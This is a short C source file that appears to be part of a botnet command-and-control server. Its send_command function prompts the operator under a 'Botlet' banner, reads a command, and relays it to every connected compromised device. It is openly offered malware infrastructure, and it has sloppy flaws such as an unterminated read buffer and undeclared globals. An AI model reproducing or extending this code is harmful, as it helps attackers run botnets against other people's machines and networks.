#include "../../includes/server/server.h"
#include "../../includes/server/data.h"
#pragma once


/*
    *    util/server/data.c
    *    Date: 11/09/21
    *    Author: 0x1CA3
*/


void send_command(int fd_user) {
    char command_buf[1024];
    char command_msg[1024];
    char command_sent_msg[1024] = "Command successfully sent to all devices!\n";

    sprintf(command_msg, "\n%s@Бotлet-[Enter Command]~# ", USERNAME);
    
    send(fd_user, command_msg, strlen(command_msg), 0);
    read(fd_user, command_buf, sizeof(command_buf));

    for (i = 0; i < MAX_DEVICES; i++) {
        d = ccon[i];        
        if (FD_ISSET(d, &fd_r)) {
            send(d, command_buf, strlen(command_buf), 0);
        }
    }
    send(fd_user, command_sent_msg, strlen(command_sent_msg), 0);
}